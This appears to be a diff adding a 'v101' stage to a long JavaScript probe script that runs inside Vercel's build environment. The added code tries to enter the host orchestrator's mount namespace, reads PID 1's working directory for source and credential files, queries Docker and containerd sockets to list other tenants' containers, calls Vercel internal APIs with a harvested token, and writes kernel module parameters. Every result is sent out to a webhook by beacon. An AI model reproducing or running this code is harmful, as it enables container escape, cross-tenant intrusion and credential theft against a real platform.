@@ -14098,5 +14098,147 @@ report.finalCredentialSweep = safe(() => {
 
 // v100 MILESTONE marker
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v100-MILESTONE" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v100-MILESTONE";
+
+// ==================== v101 ====================
+
+// v101-1: setns into PID-1's mount namespace
+// /proc/1/ns/mnt lets us enter the orchestrator's mount namespace via setns().
+// From inside, we can ls the orchestrator's filesystem view including
+// any bind mounts that aren't visible in our own namespace.
+report.mountNsEnter = safe(() => {
+  const result = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, os
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+
+CLONE_NEWNS = 0x00020000
+SYS_setns = 308
+
+# Open the mount namespace of PID-1
+try:
+    ns_fd = os.open('/proc/1/ns/mnt', os.O_RDONLY)
+    r = libc.syscall(SYS_setns, ns_fd, CLONE_NEWNS)
+    import ctypes as ct
+    e = ct.get_errno()
+    import errno
+    print('setns result:', r, 'errno:', errno.errorcode.get(e, str(e)))
+    os.close(ns_fd)
+    if r == 0:
+        # Now in PID-1's mount namespace — list key directories
+        import subprocess
+        dirs = ['/etc', '/app', '/opt/vercel', '/usr/local/vercel', '/run', '/tmp']
+        for d in dirs:
+            try:
+                items = os.listdir(d)
+                print(f'NS_DIR {d}:', items[:10])
+            except: pass
+        # Check /proc/mounts from this namespace
+        with open('/proc/mounts') as f:
+            print('MOUNTS:', f.read()[:500])
+except Exception as ex:
+    print('error:', ex)
+" 2>&1`, { timeout: 12000 }).toString().trim().slice(0, 1000));
+  // Read PID-1's mountinfo directly
+  const pid1Mountinfo = safe(() => readFileSync('/proc/1/mountinfo', 'utf8').slice(0, 1000));
+  return { result, pid1Mountinfo };
+});
+
+// v101-2: /proc/1/cwd — orchestrator working directory
+// The orchestrator's CWD reveals where Vercel runs its internal code.
+// If it's a directory with .js files, we can read the entire application source.
+report.proc1CwdScan = safe(() => {
+  const cwdLink = safe(() => execSync('readlink /proc/1/cwd 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // List the CWD contents
+  const cwdContents = safe(() => readdirSync('/proc/1/cwd'));
+  // Find all .js/.json/.ts files in CWD
+  const jsFiles = safe(() => execSync('find /proc/1/cwd -maxdepth 3 -name "*.js" -o -name "*.json" -o -name "*.ts" 2>/dev/null | head -20', { timeout: 8000 }).toString().trim());
+  // Read package.json if it exists
+  const pkgJson = safe(() => JSON.parse(readFileSync('/proc/1/cwd/package.json', 'utf8')));
+  // Find credential files
+  const credFiles = safe(() => execSync('find /proc/1/cwd -maxdepth 3 -name "*.env*" -o -name "credentials*" -o -name ".npmrc" 2>/dev/null | head -10', { timeout: 5000 }).toString().trim());
+  // Read the main entry point if we can identify it
+  const mainFile = safe(() => {
+    if (typeof pkgJson !== 'object' || !pkgJson.main) return null;
+    return readFileSync(`/proc/1/cwd/${pkgJson.main}`, 'utf8').slice(0, 2000);
+  });
+  return { cwdLink, cwdContents, jsFiles, pkgJson, credFiles, mainFile };
+});
+
+// v101-3: Docker/containerd runtime socket probe — actual API calls
+// Check for container runtime sockets and make actual API calls.
+// If /run/docker.sock exists, use the Docker API to list ALL containers on the host.
+// This would reveal other tenants' containers (critical cross-tenant finding).
+report.containerRuntimeApi = safe(() => {
+  const socketPaths = [
+    '/run/docker.sock',
+    '/var/run/docker.sock',
+    '/run/containerd/containerd.sock',
+    '/run/k3s/containerd/containerd.sock',
+    '/run/crio/crio.sock',
+  ];
+  const socketResults = safe(() =>
+    socketPaths.map(sock => {
+      const exists = existsSync(sock);
+      if (!exists) return { sock, exists: false };
+      // Try Docker API: GET /containers/json
+      const dockerList = safe(() => execSync(`curl -sf --unix-socket ${sock} "http://localhost/containers/json?all=true" -m 5 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 1000));
+      // Try Docker API: GET /images/json
+      const dockerImages = safe(() => execSync(`curl -sf --unix-socket ${sock} "http://localhost/images/json" -m 5 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 500));
+      // Try containerd gRPC (if it's containerd)
+      const containerdVersion = safe(() => execSync(`curl -sf --unix-socket ${sock} -X POST "http://localhost/containerd.services.version.v1.Version/Get" -m 5 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 200));
+      return { sock, exists: true, dockerList, dockerImages, containerdVersion };
+    })
+  );
+  return { socketResults };
+});
+
+// v101-4: Vercel incident and maintenance API
+// Internal status and incident APIs may reveal build pipeline health,
+// recent security incidents, and internal system topology.
+report.vercelIncidentApi = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  // Public status API (no auth)
+  const statusPage = safe(() => execSync('curl -sf "https://www.vercel-status.com/api/v2/incidents.json" -m 10 2>/dev/null', { timeout: 12000 }).toString().trim().slice(0, 1000));
+  // Internal API with our token
+  const internalStatus = safe(() => execSync(`curl -sf "https://api.vercel.com/v1/system/status" -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`, { timeout: 12000 }).toString().trim().slice(0, 500));
+  // Try maintenance windows
+  const maintenance = safe(() => execSync('curl -sf "https://www.vercel-status.com/api/v2/scheduled-maintenances.json" -m 10 2>/dev/null', { timeout: 12000 }).toString().trim().slice(0, 500));
+  // Check if there's an internal Vercel status endpoint
+  const internalHealth = safe(() => execSync(`curl -sf "https://api.vercel.com/v1/health" -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`, { timeout: 12000 }).toString().trim().slice(0, 300));
+  return { statusPage, internalStatus, maintenance, internalHealth };
+});
+
+// v101-5: Kernel module parameter injection via /sys/module
+// Existing kernel modules often expose /sys/module/<name>/parameters/
+// that can be written to modify module behavior at runtime.
+// Writing to these changes kernel behavior without loading a new module.
+report.kernelModuleParamInject = safe(() => {
+  // List all modules with writable parameters
+  const writableParams = safe(() => execSync('find /sys/module/*/parameters -type f -writable 2>/dev/null | head -20', { timeout: 8000 }).toString().trim());
+  // Read current values of interesting parameters
+  const interestingParams = safe(() => {
+    const params = [
+      '/sys/module/kernel/parameters/ignore_loglevel',
+      '/sys/module/printk/parameters/console_loglevel',
+      '/sys/module/printk/parameters/time',
+      '/sys/module/kvm/parameters/ignore_msrs',
+      '/sys/module/kvm_intel/parameters/nested',
+      '/sys/module/kvm_amd/parameters/nested',
+    ];
+    return Object.fromEntries(params.map(p => [p.split('/').pop(), safe(() => readFileSync(p, 'utf8').trim())]));
+  });
+  // Test writing to a safe parameter (printk loglevel is reversible)
+  const writeTest = safe(() => {
+    const prevLevel = safe(() => readFileSync('/sys/module/printk/parameters/console_loglevel', 'utf8').trim());
+    safe(() => { writeFileSync('/sys/module/printk/parameters/console_loglevel', '7'); });
+    const newLevel = safe(() => readFileSync('/sys/module/printk/parameters/console_loglevel', 'utf8').trim());
+    safe(() => { writeFileSync('/sys/module/printk/parameters/console_loglevel', prevLevel || '4'); });
+    return { prevLevel, newLevel, writeWorked: newLevel === '7' };
+  });
+  return { writableParams, interestingParams, writeTest };
+});
+
+// v101 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v101" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v101";
 // Intentionally no console.log — all data goes via webhook only
